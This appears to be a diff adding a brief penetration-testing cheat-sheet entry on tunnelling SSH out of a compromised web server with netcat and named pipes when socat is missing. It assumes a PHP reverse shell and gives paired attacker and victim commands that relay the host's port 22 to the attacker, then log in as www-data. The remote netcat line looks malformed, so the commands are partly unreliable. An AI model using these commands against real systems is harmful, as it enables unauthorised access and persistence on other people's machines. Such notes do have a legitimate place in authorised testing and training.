@@ -1,0 +1,13 @@
+
+-When user has rights to create new files and no socat is installed.
+-Also it is possible to execute commands on the compromised host 
+(php reverse shell e.g.).
+
+
+me: mkfifo tunnel
+me: nc localhost 8888 < tunnel | nc -lvnp 443 > tunnel
+
+remote: mkfifo tunnel
+remote: nc localhost 22 < tunnel | nc -lvnp 192.168.0.1 443 > tunnel
+
+me: ssh www-data@localhost 8888
